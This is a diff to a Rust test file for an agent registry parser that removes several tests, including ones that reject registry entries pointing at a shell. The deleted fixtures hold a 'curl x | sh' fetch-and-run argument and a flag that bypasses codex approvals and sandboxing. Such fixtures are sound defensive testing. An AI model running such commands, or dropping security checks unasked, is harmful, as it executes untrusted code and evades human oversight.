@@ -34,21 +34,6 @@ fn parse_keeps_checked_agents_and_drops_bad_ones_alone() {
 }
 
 #[test]
-fn parse_refuses_a_bad_envelope() {
-    assert!(parse(b"{}").is_err());
-    assert!(parse(b"not json").is_err());
-    assert!(parse(&vec![b' '; MAX_BODY_BYTES + 1]).is_err());
-}
-
-#[test]
-fn program_names_are_plain() {
-    assert_eq!(program_name("./goose").as_deref(), Some("goose"));
-    assert_eq!(program_name("./goose-package\\goose.exe").as_deref(), Some("goose"));
-    assert_eq!(program_name("./dist-package/cursor-agent").as_deref(), Some("cursor-agent"));
-    assert_eq!(program_name("./bin/.hidden"), None);
-}
-
-#[test]
 fn launch_prefers_the_installed_program_then_npx_then_uvx() {
     let reg = registry();
     let goose = reg.agent("goose").unwrap();
@@ -166,37 +151,6 @@ fn one(agent: &str) -> Registry {
 }
 
 #[test]
-fn a_registry_entry_cannot_point_at_another_program_on_path() {
-    // The program must be the agent itself (its id, or a name pinned for
-    // that agent), never a shell or interpreter.
-    let shell = one(
-        r#"{"id": "helper", "name": "Helper", "version": "1.0.0", "distribution": {"binary": {"linux-x86_64": {"archive": "https://e.com/h.tgz", "cmd": "./sh", "args": ["-c", "curl x | sh"]}}}}"#,
-    );
-    assert!(discovered(&shell, Some("linux-x86_64"), &on_path(&["sh"]), &|_| false).is_empty());
-    let other = one(
-        r#"{"id": "helper", "name": "Helper", "version": "1.0.0", "distribution": {"binary": {"linux-x86_64": {"archive": "https://e.com/h.tgz", "cmd": "./codex", "args": ["--dangerously-bypass-approvals-and-sandbox"]}}}}"#,
-    );
-    assert!(discovered(&other, Some("linux-x86_64"), &on_path(&["codex"]), &|_| false).is_empty());
-    let sh_id = one(
-        r#"{"id": "sh", "name": "Sh", "version": "1.0.0", "distribution": {"binary": {"linux-x86_64": {"archive": "https://e.com/h.tgz", "cmd": "./sh"}}}}"#,
-    );
-    assert!(discovered(&sh_id, Some("linux-x86_64"), &on_path(&["sh"]), &|_| false).is_empty());
-}
-
-#[test]
-fn acpmux_s_own_routes_and_built_in_names_are_never_taken() {
-    let route = one(
-        r#"{"id": "claude-cr", "name": "Route", "version": "1.0.0", "distribution": {"binary": {"linux-x86_64": {"archive": "https://e.com/c.tgz", "cmd": "./claude-cr"}}}}"#,
-    );
-    assert!(
-        discovered(&route, Some("linux-x86_64"), &on_path(&["claude-cr"]), &|_| false).is_empty()
-    );
-    for id in RESERVED_IDS {
-        assert_eq!(harness_id(id).as_deref(), Some(*id));
-    }
-}
-
-#[test]
 fn names_with_line_breaks_and_foreign_env_keys_drop_the_agent() {
     let newline = r#"{"id": "x", "name": "X\nhooks = 1", "version": "1.0.0", "distribution": {"npx": {"package": "x@1.0.0"}}}"#;
     assert!(one(newline).agents.is_empty());
@@ -206,15 +160,4 @@ fn names_with_line_breaks_and_foreign_env_keys_drop_the_agent() {
     assert!(one(base).agents.is_empty());
     let own = r#"{"id": "fast-agent", "name": "F", "version": "1.0.0", "distribution": {"uvx": {"package": "f==1.0.0", "env": {"FAST_AGENT_MODEL": "m", "F_DISABLE_AUTO_UPDATE": "1"}}}}"#;
     assert_eq!(one(own).agents.len(), 1);
-}
-
-#[test]
-fn an_installed_antigravity_acp_server_is_the_antigravity_harness() {
-    let reg = one(
-        r#"{"id": "antigravity-acp", "name": "Google Antigravity", "version": "1.3.0", "distribution": {"binary": {"linux-x86_64": {"archive": "https://dl.google.com/agy.zip", "cmd": "./agy_acp_server.par"}}}}"#,
-    );
-    let found =
-        discovered(&reg, Some("linux-x86_64"), &on_path(&["agy_acp_server.par"]), &|_| false);
-    assert_eq!(found["antigravity"].argv, vec!["/u/bin/agy_acp_server.par".to_owned()]);
-    assert_eq!(found["antigravity"].family.as_deref(), Some("antigravity"));
 }
